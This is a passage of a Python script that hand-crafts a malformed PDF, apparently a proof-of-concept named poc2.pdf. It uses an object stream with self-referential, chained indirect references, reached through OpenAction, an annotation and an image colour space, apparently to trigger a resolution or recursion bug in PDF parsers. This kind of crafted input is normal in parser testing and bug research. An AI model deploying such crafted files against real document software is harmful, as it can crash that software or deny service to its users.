obj(1,b'<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R >>')
obj(2,b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>')
obj(3,b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Resources << /XObject << /Im1 5 0 R >> >> /Contents 4 0 R /Annots [6 0 R] >>')

obj(4,b'<< /Length %d >>\nstream\n'%len(content)+content+b'endstream')
obj(5,b'<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace 7 0 R /BitsPerComponent 8 /Length 3 >>\nstream\n\x00\x00\x00\nendstream')
obj(6,b'<< /Type /Annot /Subtype /Widget /Rect [0 0 1 1] /A << /S /GoTo /D 7 0 R >> >>')
# object stream: object 7 is an indirect ref to object 8 (forces resolve chain); object 8 is an array with self-ish ref and dict
body=b'8 0 R [ /DeviceRGB 8 0 R ] '
header=b'7 0 8 6\n'
stream=header+body
obj(9,b'<< /Type /ObjStm /N 2 /First %d /Length %d >>\nstream\n'%(len(header),len(stream))+stream+b'\nendstream')
xref_off=sum(map(len,parts))
entries=[]
def ent(t,b,c): entries.append(bytes([t])+b.to_bytes(4,'big')+c.to_bytes(2,'big'))
ent(0,0,65535)
for n in range(1,10):
    if n==7: ent(2,9,0)
    elif n==8: ent(2,9,1)
    else: ent(1,off[n],0)
xref_stream=b''.join(entries)
# add xref object 10 as normal not included? Size 11 with index 0 10 is okay xref itself absent? usually okay? include 10 requires offset but circular. leave absent maybe.
parts.append(b'10 0 obj\n')
parts.append(b'<< /Type /XRef /Size 11 /Root 1 0 R /Index [0 10] /W [1 4 2] /Length '+str(len(xref_stream)).encode()+b' >>\nstream\n')
parts.append(xref_stream)
parts.append(b'\nendstream\nendobj\nstartxref\n'+str(xref_off).encode()+b'\n%%EOF\n')
open('/workspace/poc2.pdf','wb').write(b''.join(parts))
print(len(b''.join(parts)), xref_off)
